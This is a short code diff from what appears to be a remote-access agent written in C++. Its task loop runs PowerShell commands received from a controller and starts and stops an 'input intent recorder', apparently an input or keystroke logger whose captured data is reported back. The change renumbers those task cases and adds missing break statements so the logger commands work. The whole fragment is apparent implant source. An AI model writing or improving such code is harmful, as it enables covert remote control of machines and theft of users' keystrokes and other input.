@@ -139,11 +139,13 @@ int main(int argc, char *argv[])
                 std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
-            case 2:
+            case 18:
                 agent.StartInputIntentRecorder();
-            case 3:
+                break;
+            case 19:
                 std::string result = agent.StopInputIntentRecorder();
                 taskManager.StoreTaskResult(task.id, true, result);
+                break;
             }
         }
         Sleep(5000);
